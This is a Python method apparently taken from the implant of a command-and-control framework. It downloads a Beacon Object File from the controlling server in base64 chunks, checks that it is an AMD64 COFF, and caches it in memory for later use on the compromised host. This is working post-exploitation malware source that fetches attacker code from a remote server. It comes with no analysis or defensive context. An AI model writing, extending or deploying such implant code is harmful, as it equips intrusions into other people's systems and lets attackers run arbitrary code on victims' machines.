    def register_coff(self, task_id, bof_file, coff_name):
        import base64, hashlib, struct, threading
        data_out = bytearray()
        total_chunks = 1
        chunk_num = 1
        while chunk_num <= total_chunks:
            message = {"action": "post_response", "responses": [{
                "upload": {"chunk_size": CHUNK_SIZE, "file_id": bof_file, "chunk_num": chunk_num}, "task_id": task_id
            }]}
            response = self.postMessageAndRetrieveResponse(message)["responses"][0]
            data_out.extend(base64.b64decode(response["chunk_data"]))
            total_chunks = response["total_chunks"]
            chunk_num += 1
        if len(data_out) < 20 or len(data_out) > 2 * 1024 * 1024 or struct.unpack_from("<H", data_out, 0)[0] != 0x8664:
            raise ValueError("only AMD64 COFF files up to 2 MiB can be registered")
        if not hasattr(self, "_coff_lock"):
            self._coff_lock = threading.Lock()
        with self._coff_lock:
            if not hasattr(self, "_coff_store"):
                self._coff_store = {}
            if coff_name in self._coff_store:
                old = self._coff_store.pop(coff_name)
                old[:] = b"\x00" * len(old)
            if len(self._coff_store) >= 32:
                raise ValueError("COFF cache limit reached; unregister an object first")
            self._coff_store[coff_name] = data_out
        return 'Registered {} ({} bytes, SHA-256 {})'.format(coff_name, len(data_out), hashlib.sha256(data_out).hexdigest())
